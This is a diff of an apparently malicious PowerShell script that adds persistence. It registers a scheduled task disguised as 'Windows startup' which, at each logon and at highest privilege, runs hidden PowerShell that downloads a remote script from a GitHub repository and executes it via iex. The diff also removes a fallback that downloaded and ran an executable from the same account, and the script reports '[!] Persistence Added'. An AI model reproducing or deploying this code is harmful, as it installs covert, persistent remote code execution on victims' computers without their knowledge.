@@ -49,32 +49,8 @@ $task_name = "Windows startup"
 $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -ep bypass -c ""iwr https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -useb | iex"""
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
 
-
-try {
-    # Thử đăng ký tác vụ theo lịch
-    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
-    Write-Output "Tác vụ theo lịch đã được đăng ký thành công."
-}
-catch {
-    # Xử lý lỗi nếu có và thực hiện lệnh thay thế
-    Write-Error "Lỗi xảy ra khi đăng ký tác vụ theo lịch: $_"
-    
-    # Thực thi lệnh thay thế
-    Write-Output "Thực thi lệnh thay thế từ hai1723.com/fix.ps1"
-    try {
-        Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "$temp\aka.exe"
-        Start-Process -FilePath '$temp\aka.exe'
-        Write-Output "Lệnh thay thế đã được thực thi thành công."
-    }
-    catch {
-        Write-Error "Lỗi xảy ra khi thực thi lệnh thay thế: $_"
-    }
-}
-finally {
-    # Đoạn mã này luôn được thực thi, bất kể có lỗi hay không
-    Write-Output "Hoàn tất quy trình đăng ký tác vụ hoặc thực thi lệnh thay thế."
-}
 
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
